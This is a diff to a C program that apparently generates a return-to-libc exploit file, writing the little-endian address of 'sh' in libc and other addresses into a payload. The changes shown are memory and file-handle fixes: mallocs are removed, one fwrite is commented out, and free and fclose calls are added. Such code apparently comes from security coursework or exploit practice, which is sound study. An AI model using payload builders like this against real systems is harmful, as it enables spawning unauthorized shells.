@@ -27,8 +27,8 @@ int main(int argc, char *argv[]){
   char input;
   int numChars;
   unsigned char *instFile;
-  unsigned char *addr = malloc(10);
-  unsigned char *shAddr = malloc(8);
+  unsigned char *addr;
+  unsigned char *shAddr;
 
  
   shAddr = littleEndian(BIN_SH_ADDR, ADDR_SIZE);
@@ -69,7 +69,7 @@ int main(int argc, char *argv[]){
   }
   
   //write address of 'sh' in libc memory to file first
-  fwrite(shAddr, sizeof(char), ADDR_SIZE, file);
+  //fwrite(shAddr, sizeof(char), ADDR_SIZE, file);
   for(i = 0; i < ADDR_SIZE; i++){
     fwrite(shAddr+i, sizeof(char), 1, file);    
   }
@@ -99,8 +99,10 @@ int main(int argc, char *argv[]){
   fwrite(addr, sizeof(char), ADDR_SIZE, file);
   
   free(addr);
+  free(shAddr);
 
-  fclose(file); 
+  fclose(file);
+  fclose(instFp);
 }
 
 /*
